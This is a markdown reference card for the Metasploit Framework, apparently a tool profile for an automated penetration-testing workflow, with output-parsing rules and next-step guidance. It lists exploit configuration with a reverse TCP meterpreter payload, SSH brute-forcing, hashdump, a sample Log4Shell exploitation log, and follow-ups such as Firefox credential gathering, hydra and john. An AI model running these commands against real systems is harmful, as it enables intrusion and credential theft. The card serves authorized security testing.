# Metasploit Framework - Penetration Testing Framework

## Overview
| Attribute | Value |
|-----------|-------|
| Binary | `msfconsole` |
| Category | Exploitation, Post-Exploitation |
| Risk Level | High |

## Description
Metasploit Framework is the most widely used penetration testing framework, providing exploit modules, payload generation, post-exploitation tools, and auxiliary scanners for comprehensive security assessments.

---

## Basic Commands

### 1. Launch Console
```bash
msfconsole
```

### 2. Search Modules
**Goal:** Find exploits, auxiliaries, or payloads by name, CVE, or platform.
```bash
search type:exploit name:apache
search cve:2021-44228
search platform:linux type:exploit
```

### 3. Use a Module
**Goal:** Select and load a module for configuration.
```bash
use exploit/multi/handler
use auxiliary/scanner/ssh/ssh_login
```

### 4. View Options
**Goal:** See configurable parameters and available payloads.
```bash
show options
show payloads
show targets
```

### 5. Set Parameters
**Goal:** Configure target, payload, and listener settings.
```bash
set RHOSTS 192.168.1.1
set RPORT 445
set LHOST 192.168.1.100
set PAYLOAD linux/x64/meterpreter/reverse_tcp
```

### 6. Execute
**Goal:** Run the configured exploit or auxiliary module.
```bash
exploit
run
```

---

## Module Types
| Type | Description |
|------|-------------|
| `exploit` | Vulnerability exploitation modules |
| `auxiliary` | Scanning, fingerprinting, fuzzing modules |
| `payload` | Code delivered to the target upon exploitation |
| `post` | Post-exploitation modules (data gathering, pivoting) |
| `encoder` | Payload encoding for evasion |

---

## Common Auxiliary Modules
```bash
# SSH Brute-force
use auxiliary/scanner/ssh/ssh_login

# SMB Version Scanning
use auxiliary/scanner/smb/smb_version

# TCP Port Scanning
use auxiliary/scanner/portscan/tcp
```

---

## Meterpreter Common Commands
```bash
sysinfo          # System information
getuid           # Current user
ps               # Process list
shell            # Drop to system shell
upload/download  # File transfer
hashdump         # Dump password hashes
```

---

## Output Parsing

### Sample Output
```
msf6 > search type:exploit name:log4j

Matching Modules
================

   #  Name                                          Disclosure Date  Rank       Check  Description
   -  ----                                          ---------------  ----       -----  -----------
   0  exploit/multi/http/log4shell_header_injection  2021-12-09       excellent  Yes    Log4Shell HTTP Header Injection

msf6 exploit(multi/http/log4shell_header_injection) > exploit

[*] Started reverse TCP handler on 192.168.1.100:4444
[*] Running automatic check ("set AutoCheck false" to disable)
[+] The target is vulnerable.
[*] Sending stage (58829 bytes) to 192.168.1.10
[*] Meterpreter session 1 opened (192.168.1.100:4444 -> 192.168.1.10:42345)

meterpreter >
```

### Parsing Rules
- `[*]` = informational messages
- `[+]` = success / positive finding
- `[-]` = failure
- `[!]` = warning
- `Matching Modules` table = search results with rank and check support
- `show options` = required parameters for the module
- `session X opened` = **successful exploitation**

---

## Next Steps

| Finding | Recommended Next Tool | Example |
|---------|----------------------|---------|
| Session opened | Post-exploitation modules | `use post/multi/gather/firefox_creds` |
| Exploit found but failed | Try alternative exploit | `search type:exploit name:<service>` |
| Auxiliary scan results | `nmap` for deeper service scan | `nmap -sV -sC <target>` |
| Credentials found | `hydra` to test credential reuse | `hydra -l user -p pass target ssh` |
| Hash dump obtained | Offline cracking | `john --wordlist=rockyou.txt hashes.txt` |

---

## Safety Warnings
| Risk | Description |
|------|-------------|
| **High Impact** | Exploits execute arbitrary code on target systems. |
| **Legal** | Unauthorized use is illegal and can result in prosecution. |
| **Detection** | Exploit traffic is easily detected by IDS/EDR solutions. |

> **Warning:** Only use on targets with explicit written authorization.
